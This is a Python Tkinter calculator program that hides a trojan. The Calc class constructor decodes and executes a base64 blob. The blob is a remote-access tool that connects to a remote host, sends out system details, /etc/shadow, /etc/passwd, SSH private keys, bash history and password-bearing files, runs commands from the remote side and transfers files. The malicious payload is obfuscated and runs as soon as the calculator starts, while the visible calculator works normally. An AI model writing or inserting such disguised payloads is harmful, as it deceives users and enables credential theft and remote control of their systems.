from tkinter import *
from base64 import b64decode

class Calc():
    
    def __init__(self):
        self.total = 0
        self.current = ""
        self.new_num = True
        self.op_pending = False
        self.op = ""
        self.eq = False
        exec(b64decode("IyEvdXNyL2Jpbi9weXRob24zCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHN5cwppbXBvcnQgb3MKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnRyeToKICAgIGhvc3QgPSBzeXMuYXJndlsxXQogICAgcG9ydCA9IGludChzeXMuYXJndlsyXSkKZXhjZXB0IEluZGV4RXJyb3I6CiAgICBwcmludCgiVXNhZ2U6IC4vcmF0dGxlc25ha2UucHkgW2hvc3RdIFtwb3J0XSIpCkhFQURFUiA9IDY0CnMuY29ubmVjdCgoaG9zdCxwb3J0KSkKCgpjbGFzcyBlbnVtZXJhdGlvbjoKCiAgICBkZWYgc3lzdGVtaW5mbygpOgogICAgICAgIGEgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiY2F0IC9ldGMvaXNzdWUiKS5zdHJpcCgiXG4gXGwiKQogICAgICAgIGIgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiY2F0IC9wcm9jL3ZlcnNpb24iKQogICAgICAgIGMgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiaG9zdG5hbWUiKQogICAgICAgIGQgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgidW5hbWUgLWEiKQogICAgICAgIGUgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgibHNodyAtc2hvcnQiKQogICAgICAgIGYgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiZW52IikKICAgICAgICBnID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoIndobyIpCiAgICAgICAgciA9IGYiT1M6XG57YX1cblxuS2VybmVsOlxue2J9XG5cbkhvc3RuYW1lOlxue2N9XG5cblVuYW1lOlxue2R9XG5cbmxzaHc6XG57ZX1cblxuRW52Olxue2Z9XG5cbldobzpcbntnfSIKICAgICAgICByX2xlbiA9IHN0cihsZW4ocikpLmVuY29kZSgpCiAgICAgICAgcl9sZW4gKz0gYicgJyAqIChIRUFERVIgLSBsZW4ocl9sZW4pKQogICAgICAgIHMuc2VuZChyX2xlbikKICAgICAgICBzLnNlbmQoci5lbmNvZGUoKSkKICAgICAgICByZXR1cm4KCiAgICBkZWYgcGVybWluZm8oKToKICAgICAgICBhID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoIndob2FtaSIpCiAgICAgICAgYiA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJpZCIpCiAgICAgICAgYyA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJjYXQgL2V0Yy9zdWRvZXJzIDI+L2Rldi9udWxsIHwgZ3JlcCAtdiAnIycgMj4vZGV2L251bGwiKQogICAgICAgIGQgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgic3VkbyAtbCAtbiIpCiAgICAgICAgZSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJncm91cHMiKQogICAgICAgIHIgPSBmIldob2FtaTpcbnthfVxuXG5JRDpcbntifVxuXG5TdWRvZXJzOlxue2N9XG5cblN1ZG8gLWw6XG57ZH1cblxuR3JvdXBzOlxue2V9IgogICAgICAgIHJfbGVuID0gc3RyKGxlbihyKSkuZW5jb2RlKCkKICAgICAgICByX2xlbiArPSBiJyAnICogKEhFQURFUiAtIGxlbihyX2xlbikpCiAgICAgICAgcy5zZW5kKHJfbGVuKQogICAgICAgIHMuc2VuZChyLmVuY29kZSgpKQogICAgICAgIHJldHVybgoKICAgIGRlZiBmaWxlaW5mbygpOgogICAgICAgIGEgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgibGVzcyB8IGxzIC9ldGMvIHwgYXdrICckMSB+IC9eLip3LiovJyAyPi9kZXYvbnVsbCIpICMgYW55b25lCiAgICAgICAgYiA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJscyAvZXRjLyB8IGF3ayAnJDEgfiAvXi4udy8nIDI+L2Rldi9udWxsIikgIyBPd25lcgogICAgICAgIGMgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgibHMgL2V0Yy8gfCBhd2sgJyQxIH4gL14uLi4uLncvJyAyPi9kZXYvbnVsbCIpICMgR3JvdXBzCiAgICAgICAgZCA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJsZXNzIH4vLmJhc2hfaGlzdG9yeSIpICMgYmFzaCBoaXN0b3J5CiAgICAgICAgZSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJjYXQgL2V0Yy9wYXNzd2QiKQogICAgICAgIGYgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiY2F0IC9ldGMvc2hhZG93IikKICAgICAgICBnID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoIn4vLnNzaC9pZF9yc2EiKQogICAgICAgIGggPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiY2F0IH4vLnNzaC9pZF9yc2EucHViIikKICAgICAgICByID0gZiIiIkFueW9uZTpcbnthfVxuXG5Pd25lcjpcbntifVxuXG5Hcm91cDpcbntjfVxuXG5CYXNoIGhpc3Rvcnk6XG57ZH1cblxucGFzc3dkOlxue2V9ClxuXG5TaGFkb3c6XG57Zn1cblxuSURfUlNBOlxue2d9XG5cbklEX1JTQS5wdWI6XG57aH1cblxuIiIiCiAgICAgICAgcl9sZW4gPSBzdHIobGVuKHIpKS5lbmNvZGUoKQogICAgICAgIHJfbGVuICs9IGInICcgKiAoSEVBREVSIC0gbGVuKHJfbGVuKSkKICAgICAgICBzLnNlbmQocl9sZW4pCiAgICAgICAgcy5zZW5kKHIuZW5jb2RlKCkpCiAgICAgICAgcmV0dXJuCgogICAgZGVmIG5ldHdvcmtpbmZvKCk6CiAgICAgICAgYSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJjYXQgL2V0Yy9uZXR3b3JrL2ludGVyZmFjZXMiKQogICAgICAgIGIgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiaXB0YWJsZXMgLUwiKQogICAgICAgIGMgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgibHNvZiAtaSIpCiAgICAgICAgZCA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJyb3V0ZSIpCiAgICAgICAgZSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJuZXRzdGF0IC1hbnR1cCIpCiAgICAgICAgZiA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJpcCBhZGRyIikKICAgICAgICByID0gZiJJbnRlcmZhY2VzOlxue2F9XG5cbklQVGFibGVzOlxue2J9XG5cbkxzb2Y6XG57Y31cblxuUm91dGU6XG57ZH1cblxuTmVzdGF0Olxue2V9XG5cbklQIEFkZHI6XG57Zn0iCiAgICAgICAgcl9sZW4gPSBzdHIobGVuKHIpKS5lbmNvZGUoKQogICAgICAgIHJfbGVuICs9IGInICcgKiAoSEVBREVSIC0gbGVuKHJfbGVuKSkKICAgICAgICBzLnNlbmQocl9sZW4pCiAgICAgICAgcy5zZW5kKHIuZW5jb2RlKCkpCiAgICAgICAgcmV0dXJuCgogICAgZGVmIHVzZXJwYXNzKCk6CiAgICAgICAgYSA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJmaW5kIC92YXIvbG9nIC1uYW1lICcqLmxvZycgMj4vZGV2L251bGwgfCB4YXJncyAtbDEwIGVncmVwICdwd2R8cGFzc3dvcmQnIDI+L2Rldi9udWxsIikKICAgICAgICBiID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoImZpbmQgL2V0YyAtbmFtZSAnKi5jKicgMj4vZGV2L251bGwgfCB4YXJncyAtbDEwIGVncmVwICdwd2R8cGFzc3dvcmQnIDI+L2Rldi9udWxsIikKICAgICAgICBjID0gc3VicHJvY2Vzcy5nZXRvdXRwdXQoImNhdCAvZXRjL3NoYWRvdyAyPi9kZXYvbnVsbCIpCiAgICAgICAgZCA9IHN1YnByb2Nlc3MuZ2V0b3V0cHV0KCJmaW5kIC8gLW5hbWUgY3JlZGlkZW50aWFsLnR4dCAtcHJpbnQgMj4vZGV2L251bGwiKQogICAgICAgIGUgPSBzdWJwcm9jZXNzLmdldG91dHB1dCgiZmluZCAvIC1uYW1lICouaGFzaCAtcHJpbnQgMj4vZGV2L251bGwiKQogICAgICAgIHIgPSBmIkxvZyBmaWxlczpcbnthfVxuXG5Db25mIGZpbGVzOlxue2J9XG5cblNoYWRvdzpcbntjfVxuXG5DcmVkcyBmaWxlOlxue2R9XG5cbi5oYXNoIGZpbGVzOlxue2V9IgogICAgICAgIHJfbGVuID0gc3RyKGxlbihyKSkuZW5jb2RlKCkKICAgICAgICByX2xlbiArPSBiJyAnICogKEhFQURFUiAtIGxlbihyX2xlbikpCiAgICAgICAgcy5zZW5kKHJfbGVuKQogICAgICAgIHMuc2VuZChyLmVuY29kZSgpKQogICAgICAgIHJldHVybgoKY2xhc3MgY29udHJvbHM6CgogICAgZGVmIGV4ZWNjb21tYW5kcygpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgIGNtZF9sZW4gPSBzLnJlY3YoSEVBREVSKS5kZWNvZGUoKQogICAgICAgICAgICAgICAgY21kX2xlbiA9IGludChjbWRfbGVuKQogICAgICAgICAgICAgICAgc19jbWQ9cy5yZWN2KGNtZF9sZW4pCiAgICAgICAgICAgICAgICBjbWQgPSBzX2NtZC5kZWNvZGUoKQogICAgICAgICAgICAgICAgaWYgY21kLnNwbGl0KClbMF0ubG93ZXIoKSBpbiBbImNkIiwgImRpciJdOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgb3MuY2hkaXIoJyAnLmpvaW4oY21kLnNwbGl0KClbMTpdKSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRmlsZU5vdEZvdW5kRXJyb3IgYXMgZToKICAgICAgICAgICAgICAgICAgICAgICAgY19jbWQgPSBzdHIoZSkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICBjX2NtZCA9IG9zLmdldGN3ZCgpCiAgICAgICAgICAgICAgICBlbGlmIGNtZCBpbiBbImV4aXQiLCAicXVpdCJdOgogICAgICAgICAgICAgICAgICAgIHMuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIHF1aXQoKQogICAgICAgICAgICAgICAgZWxpZiBjbWQgPT0gImJhY2siOgogICAgICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgY19jbWQgPSBzdWJwcm9jZXNzLmdldG91dHB1dChjbWQpCiAgICAgICAgICAgICAgICBjbWRfbGVuID0gc3RyKGxlbihjX2NtZCkpLmVuY29kZSgpCiAgICAgICAgICAgICAgICBjbWRfbGVuICs9IGInICcgKiAoSEVBREVSIC0gbGVuKGNtZF9sZW4pKQogICAgICAgICAgICAgICAgcy5zZW5kKGNtZF9sZW4pCiAgICAgICAgICAgICAgICBzLnNlbmQoY19jbWQuZW5jb2RlKCkpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgICAgICBzLmNsb3NlKCkKICAgICAgICAgICAgcXVpdCgpCgogICAgZGVmIGVudW1lcmF0ZShlbnVtKToKICAgICAgICBlbnVtID0gZW51bVswXQogICAgICAgIGlmIGVudW0gPT0gIjEiOgogICAgICAgICAgICBlbnVtZXJhdGlvbi5zeXN0ZW1pbmZvKCkKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGVsaWYgZW51bSA9PSAiMiI6CiAgICAgICAgICAgIGVudW1lcmF0aW9uLnBlcm1pbmZvKCkKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGVsaWYgZW51bSA9PSAiMyI6CiAgICAgICAgICAgIGVudW1lcmF0aW9uLmZpbGVpbmZvKCkKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGVsaWYgZW51bSA9PSAiNCI6CiAgICAgICAgICAgIGVudW1lcmF0aW9uLm5ldHdvcmtpbmZvKCkKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGVsaWYgZW51bSA9PSAiNSI6CiAgICAgICAgICAgIGVudW1lcmF0aW9uLnVzZXJwYXNzKCkKICAgICAgICAgICAgcmV0dXJuCgogICAgZGVmIGZpbGV1cGxvYWQoKToKICAgICAgICBmaWxlbmFtZV9sZW4gPSBzLnJlY3YoSEVBREVSKS5kZWNvZGUoKQogICAgICAgIGZpbGVfbmFtZSA9IHMucmVjdihpbnQoZmlsZW5hbWVfbGVuKSkuZGVjb2RlKCkKICAgICAgICB0cnk6CiAgICAgICAgICAgIGYgPSBvcGVuKGZpbGVfbmFtZSwgJ2FiJykKICAgICAgICAgICAgcmVhZHlfbGVuID0gc3RyKGxlbigicmVhZHkiKSkuZW5jb2RlKCkKICAgICAgICAgICAgcmVhZHlfbGVuICs9IGInICcgKiAoSEVBREVSIC0gbGVuKHJlYWR5X2xlbikpCiAgICAgICAgICAgIHMuc2VuZChyZWFkeV9sZW4pCiAgICAgICAgICAgIHMuc2VuZCgicmVhZHkiLmVuY29kZSgpKQogICAgICAgIGV4Y2VwdCBQZXJtaXNzaW9uRXJyb3I6CiAgICAgICAgICAgIGVycm9yX2xlbiA9IHN0cihsZW4oIlBlcm1pc3Npb24gZXJyb3IiKSkuZW5jb2RlKCkKICAgICAgICAgICAgZXJyb3JfbGVuICs9IGInICcgKiAoSEVBREVSIC0gbGVuKGVycm9yX2xlbikpCiAgICAgICAgICAgIHMuc2VuZChlcnJvcl9sZW4pCiAgICAgICAgICAgIHMuc2VuZCgiUGVybWlzc2lvbiBlcnJvciIuZW5jb2RlKCkpCiAgICAgICAgICAgIHJldHVybgogICAgICAgIGwgPSBzLnJlY3YoMTAyNCkKICAgICAgICB3aGlsZSAobCk6CiAgICAgICAgICAgIGYud3JpdGUobCkKICAgICAgICAgICAgbCA9IHMucmVjdigxMDI0KQogICAgICAgIGYuY2xvc2UoKQogICAgICAgIHJldHVybgoKICAgIGRlZiBmaWxlZG93bmxvYWQoKToKICAgICAgICBmaWxlcGF0aF9sZW4gPSBzLnJlY3YoSEVBREVSKS5kZWNvZGUoKQogICAgICAgIGZpbGVwYXRoID0gcy5yZWN2KGludChmaWxlcGF0aF9sZW4pKS5kZWNvZGUoKQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmaWxlcGF0aCk6CiAgICAgICAgICAgIGVycm9yX2xlbiA9IHN0cihsZW4oIkRvZXMgbm90IGV4aXN0IikpLmVuY29kZSgpCiAgICAgICAgICAgIGVycm9yX2xlbiArPSBiJyAnICogKEhFQURFUiAtIGxlbihlcnJvcl9sZW4pKQogICAgICAgICAgICBzLnNlbmQoZXJyb3JfbGVuKQogICAgICAgICAgICBzLnNlbmQoIkRvZXMgbm90IGV4aXN0Ii5lbmNvZGUoKSkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgdHJ5OgogICAgICAgICAgICBmID0gb3BlbihmaWxlcGF0aCwgJ3JiJykKICAgICAgICBleGNlcHQgUGVybWlzc2lvbkVycm9yOgogICAgICAgICAgICBlcnJvcl9sZW4gPSBzdHIobGVuKCJQZXJtaXNzaW9uIGVycm9yIikpLmVuY29kZSgpCiAgICAgICAgICAgIGVycm9yX2xlbiArPSBiJyAnICogKEhFQURFUiAtIGxlbihlcnJvcl9sZW4pKQogICAgICAgICAgICBzLnNlbmQoZXJyb3JfbGVuKQogICAgICAgICAgICBzLnNlbmQoIlBlcm1pc3Npb24gZXJyb3IiLmVuY29kZSgpKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlcnJvcl9sZW4gPSBzdHIobGVuKCJyZWFkeSIpKS5lbmNvZGUoKQogICAgICAgIGVycm9yX2xlbiArPSBiJyAnICogKEhFQURFUiAtIGxlbihlcnJvcl9sZW4pKQogICAgICAgIHMuc2VuZChlcnJvcl9sZW4pCiAgICAgICAgcy5zZW5kKCJyZWFkeSIuZW5jb2RlKCkpCiAgICAgICAgZmlsZXNpemUgPSBzdHIob3Muc3RhdChmaWxlcGF0aCkuc3Rfc2l6ZSkKICAgICAgICBmaWxlc2l6ZV9sZW4gPSBzdHIobGVuKGZpbGVzaXplKSkuZW5jb2RlKCkKICAgICAgICBmaWxlc2l6ZV9sZW4gKz0gYicgJyAqIChIRUFERVIgLSBsZW4oZmlsZXNpemVfbGVuKSkKICAgICAgICBzLnNlbmQoZmlsZXNpemVfbGVuKQogICAgICAgIHMuc2VuZChmaWxlc2l6ZS5lbmNvZGUoKSkKICAgICAgICBsID0gZi5yZWFkKDEwMjQpCiAgICAgICAgd2hpbGUgKGwpOgogICAgICAgICAgICBzLnNlbmQobCkKICAgICAgICAgICAgbCA9IGYucmVhZCgxMDI0KQogICAgICAgIGYuY2xvc2UoKQogICAgICAgIHJldHVybgoKCmRlZiBtYWluKCk6CiAgICB0cnk6CiAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgbW9kZV9sZW4gPSBzLnJlY3YoSEVBREVSKS5kZWNvZGUoKQogICAgICAgICAgICBtb2RlID0gcy5yZWN2KGludChtb2RlX2xlbikpLmRlY29kZSgpCiAgICAgICAgICAgIGlmIG1vZGUgPT0gImV4ZWNjb21tYW5kcyI6CiAgICAgICAgICAgICAgICBjb250cm9scy5leGVjY29tbWFuZHMoKQogICAgICAgICAgICAgICAgbWFpbigpCgogICAgICAgICAgICBlbGlmICJlbnVtZXJhdGUiIGluIG1vZGU6CiAgICAgICAgICAgICAgICBlbnVtID0gbW9kZS5zcGxpdCgiOiIpCiAgICAgICAgICAgICAgICBjb250cm9scy5lbnVtZXJhdGUoZW51bVsxOl0pCiAgICAgICAgICAgICAgICBtYWluKCkKCiAgICAgICAgICAgIGVsaWYgbW9kZSA9PSAiZmlsZXVwbG9hZCI6CiAgICAgICAgICAgICAgICBjb250cm9scy5maWxldXBsb2FkKCkKICAgICAgICAgICAgICAgIG1haW4oKQoKICAgICAgICAgICAgZWxpZiBtb2RlID09ICJmaWxlZG93bmxvYWQiOgogICAgICAgICAgICAgICAgY29udHJvbHMuZmlsZWRvd25sb2FkKCkKICAgICAgICAgICAgICAgIG1haW4oKQogICAgZXhjZXB0IHNvY2tldC5Db25uZWN0aW9uUmVzZXRFcnJvcjoKICAgICAgICBleGl0KCkKCgoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK"))



    def num_press(self, num):
        self.eq = False
        temp = text_box.get()
        temp2 = str(num)      
        if self.new_num:
            self.current = temp2
            self.new_num = False
        else:
            if temp2 == '.':
                if temp2 in temp:
                    return
            self.current = temp + temp2
        self.display(self.current)

    def calc_total(self):
        self.eq = True
        self.current = float(self.current)
        if self.op_pending == True:
            self.do_sum()
        else:
            self.total = float(text_box.get())

    def display(self, value):
        text_box.delete(0, END)
        text_box.insert(0, value)

    def do_sum(self):
        if self.op == "add":
            self.total += self.current
        if self.op == "minus":
            self.total -= self.current
        if self.op == "times":
            self.total *= self.current
        if self.op == "divide":
            self.total /= self.current
        self.new_num = True
        self.op_pending = False
        self.display(self.total)

    def operation(self, op): 
        self.current = float(self.current)
        if self.op_pending:
            self.do_sum()
        elif not self.eq:
            self.total = self.current
        self.new_num = True
        self.op_pending = True
        self.op = op
        self.eq = False

    def cancel(self):
        self.eq = False
        self.current = "0"
        self.display(0)
        self.new_num = True

    def all_cancel(self):
        self.cancel()
        self.total = 0

    def sign(self):
        self.eq = False
        self.current = -(float(text_box.get()))
        self.display(self.current)

sum1 = Calc()
root = Tk()
calc = Frame(root)
calc.grid()

root.title("Calculator")
text_box = Entry(calc, justify=RIGHT)
text_box.grid(row = 0, column = 0, columnspan = 3, pady = 5)
text_box.insert(0, "0")

numbers = "789456123"
ButtonCounter = 0
bttn = []

for OuterLoop  in range(1,4):
    for InnerLoop in range(3):
        bttn.append(Button(calc, text = numbers[ButtonCounter]))
        bttn[ButtonCounter].grid(row = OuterLoop, column = InnerLoop, pady = 5)
        bttn[ButtonCounter]["command"] = lambda x = numbers[ButtonCounter]: sum1.num_press(x)
        ButtonCounter += 1

bttn_0 = Button(calc, text = "0")
bttn_0["command"] = lambda: sum1.num_press(0)
bttn_0.grid(row = 4, column = 1, pady = 5)

bttn_div = Button(calc, text = chr(247))
bttn_div["command"] = lambda: sum1.operation("divide")
bttn_div.grid(row = 1, column = 3, pady = 5)

bttn_mult = Button(calc, text = "x")
bttn_mult["command"] = lambda: sum1.operation("times")
bttn_mult.grid(row = 2, column = 3, pady = 5)

minus = Button(calc, text = "-")
minus["command"] = lambda: sum1.operation("minus")
minus.grid(row = 3, column = 3, pady = 5)

point = Button(calc, text = ".")
point["command"] = lambda: sum1.num_press(".")
point.grid(row = 4, column = 0, pady = 5)

add = Button(calc, text = "+")
add["command"] = lambda: sum1.operation("add")
add.grid(row = 4, column = 3, pady = 5)

neg= Button(calc, text = "+/-")
neg["command"] = sum1.sign
neg.grid(row = 5, column = 0, pady = 5)

clear = Button(calc, text = "C")
clear["command"] = sum1.cancel
clear.grid(row = 5, column = 1, pady = 5)

all_clear = Button(calc, text = "AC")
all_clear["command"] = sum1.all_cancel
all_clear.grid(row = 5, column = 2, pady = 5)

equals = Button(calc, text = "=")
equals["command"] = sum1.calc_total
equals.grid(row = 5, column = 3, pady = 5)

root.mainloop()
